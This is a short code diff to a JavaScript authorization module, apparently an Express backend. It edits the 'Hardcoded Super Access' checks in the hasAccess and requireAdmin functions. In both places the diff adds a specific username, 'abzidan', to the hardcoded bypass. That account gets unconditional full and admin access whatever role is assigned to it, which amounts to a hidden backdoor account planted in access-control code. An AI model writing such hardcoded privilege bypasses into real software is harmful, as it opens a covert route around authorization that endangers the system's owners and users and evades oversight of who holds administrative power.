@@ -53,7 +53,7 @@ function hasAccess(user, table, action = 'read') {
     const username = (user.username || '').toLowerCase().trim();
 
     // 🌟 Hardcoded Super Access 🌟
-    if (username === 'admin' || ['admin', 'super admin', 'superadmin', 'system admin', 'systemadmin'].includes(role)) {
+    if (username === 'admin' || username === 'abzidan' || ['admin', 'super admin', 'superadmin', 'system admin', 'systemadmin'].includes(role)) {
         return true;
     }
 
@@ -99,7 +99,7 @@ const requireAdmin = (req, res, next) => {
     const username = (req.user.username || '').toLowerCase().trim();
 
     // 🌟 Hardcoded Super Access 🌟
-    if (username === 'admin' || ['admin', 'super admin', 'superadmin', 'system admin', 'systemadmin'].includes(role)) {
+    if (username === 'admin' || username === 'abzidan' || ['admin', 'super admin', 'superadmin', 'system admin', 'systemadmin'].includes(role)) {
         return next();
     }
     
